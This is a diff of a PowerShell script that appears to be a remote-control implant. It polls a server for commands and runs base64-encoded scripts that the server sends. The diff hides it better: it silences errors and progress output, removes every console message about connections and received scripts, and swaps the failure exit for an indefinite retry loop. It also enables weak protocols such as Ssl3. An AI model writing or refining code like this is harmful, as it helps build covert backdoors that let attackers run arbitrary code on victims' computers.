@@ -8,8 +8,8 @@ $global:countrycode = ""
 $global:lat = ""
 $global:lon = ""
 
-#$ErrorActionPreference = "SilentlyContinue"
-#$ProgressPreference = 'SilentlyContinue'
+$ErrorActionPreference = "SilentlyContinue"
+$ProgressPreference = 'SilentlyContinue'
 
 [System.Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"
 
@@ -31,7 +31,8 @@ function Get-Info {
             $global:lat = ($req.Content | ConvertFrom-Json).lat
             $global:lon = ($req.Content | ConvertFrom-Json).lon
         } else {
-            Exit 1
+            Start-Sleep -Seconds 100
+            Get-Info
         }
     }
 
@@ -98,12 +99,9 @@ function Invoke-InitialConnection {
                         LoadScript -base64_script $script
                     }
                 }
-                
-                Write-Host "Connected to server: $global:ip_port"
             }
         }
         catch {
-            Write-Host "Connection failed: $_"
             Start-Sleep -Seconds 10
         }
     }
@@ -118,10 +116,8 @@ function Invoke-CheckForCommands {
         
         if ($req.StatusCode -eq 200) {
             $outData = $req.Content | ConvertFrom-Json
-            
-            # Process any scripts that need to be run
+
             if ($outData.new_run -eq $true -and $outData.scripts.Count -gt 0) {
-                Write-Host "Received $($outData.scripts.Count) script(s) to execute."
                 foreach ($script in $outData.scripts) {
                     LoadScript -base64_script $script
                 }
@@ -129,7 +125,6 @@ function Invoke-CheckForCommands {
         }
     }
     catch {
-        Write-Host "Failed to check for commands: $_"
     }
 }
 
